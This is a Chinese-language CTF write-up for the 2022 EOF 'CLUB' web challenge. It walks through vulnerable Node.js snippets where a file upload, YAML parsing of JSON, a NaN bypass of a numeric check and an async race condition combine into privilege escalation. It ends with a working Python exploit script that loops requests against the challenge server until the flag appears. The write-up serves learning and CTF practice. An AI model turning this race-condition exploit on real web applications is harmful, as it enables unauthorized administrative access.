# 2022 EOF Writeup

這次比賽基本上都沒解出幾題，這邊 Writeup 大部分都是事後解完補上去的 QQ

## CLUB

這題基本原理是利用 Node.js 本身實作 Schedule 的機制，透過 Promise Await 與 Callback 混合實作的問題讓 Middleware 認證機制產生 Race Condition，達到讀取高權限頁面的目的。

要解決這個問題需要保證對 DB 的讀寫以及驗證都要是一個完整的 Transaction（對單一用戶要是 Atomic 的），才不會有下面這個 Race Condition 的產生。

### Target & Vulnerable Point

這題是在模仿一般網站頁面的權限驗證機制，如果使用者的 Config Group Level 是大於 2 的話就可以查看 Admin Page。

```js
app.get("/profile", requireLogin, ensureConfig(), async (req, res) => {
    const configPath = await Users.getConfig(req.session.username);
    const config = loadConfig(configPath);
    if (config.group <= 2) {
        res.render("profile", { username: req.session.username, config });
    } else {

        // ...

        res.render("admin", {
            messages: parsed,
            username: "admin",
            config: { bgColor: "#00f", color: "#0f0" },
        });
    }
});
```

但整體應用程式實作上出了以下幾個問題，串再一起就可以達成 Vertical Privilege Escalation。總共有 4 個地方：

1. 可以上傳檔案到 Config 檔案儲存的同個資料夾，並且檔名可知：

```js
app.post("/sendMessage", requireLogin, async (req, res) => {
    const message = JSON.stringify(req.body);
    const messageHash = sha256(message);

    fs.writeFileSync(`./storage/${messageHash}.json`, message);

    // ...

    res.redirect("/");
});
```

2. npm yaml library 是可以 Load json 格式的，導致所有 Yaml 格式可以被解讀成設定資料，讓攻擊者可以任意設定權限大小
3. 處理權限數值的防禦實作上有缺陷，可以透過附值成 `NaN` 來略過所有檢查

```js
// 檢查是否為數字字串的地方
function isNumberStr(x) {
    if (typeof x !== "string") {
      return false;
    }
    return String(Number(x)) == x;
}

// Load Config 的地方
const loadConfig = function (configPath) {
    const normalizedPath = path.resolve("/", configPath);
    const configStr = fs.readFileSync(`./storage${normalizedPath}`, "utf8");
    const config = YAML.parse(configStr);
    if (!isNumberStr(config.group)) {
        config.group = "0";
    }
    config.group = Math.max(0, Math.min(2, Number(config.group)));

    // ...

    return config;
};
```

4. Js Race Condition 的問題

```js
// 處理 DB 的地方是用 Callback 的形式實作
function setConfig(username, config) {
   return new Promise((resolve, reject) => {
      db.run(
            "UPDATE Users SET config = ? WHERE username = ?",
            [config, username],
            (err) => {
                if (err) {
                    reject(err);
                } else {
                    resolve();
                }
            }
        );
    });
}

// 路徑認證的地方是使用 Async / Await 的模式實作
const ensureConfig = (forceLogin = true) => {
    return async function (req, res, next) {
        if (forceLogin && !req.session.username) {
            res.status(403).send("login required");
        } else {
            if (req.session.username) {
                const acceptable = ["tier0.yml", "tier1.yml", "tier2.yml"];
                const config = await Users.getConfig(req.session.username);
                // Bad Things Happend here. If race condition happen here, config will get legit content but update will happen later.
                if (!acceptable.includes(config)) {
                    Users.setConfig(req.session.username, acceptable[0]);
                }
            }
            next();
        }
    };
};
```

以上幾個實作上的漏洞，就可以的成垂直擴權的目的了

### Pwn Script

```python
from requests import get, post, Session

URL = "http://dsnspc.retro9.me:9000"
session = Session()

# Login and Create Session
session.post(URL+"/login", data={
    "username": "Retro9"
})

print("Login User as Retro9 ...")

# Check Profile
# print(session.get(URL+"/profile").text

# Send Message to The Server
session.post(URL+"/sendMessage", data={
    "title": "Title",
    "content": "Content",
    "group": "NaN"
})

ROUGE_YAML_FILE = "108536e1544d04754f60d3a4d946e35db7038fc731aef90510852f45a920c8fc.json"

# Update and Race Condition
while True:
    result = session.post(URL+"/update", data={
        "config": ROUGE_YAML_FILE
    })

    if "EOF{" in result.text:
        print(result.text)
        break

```

![RaceCondition](resources/Screen%20Shot%202022-02-21%20at%205.01.37%20PM.png)
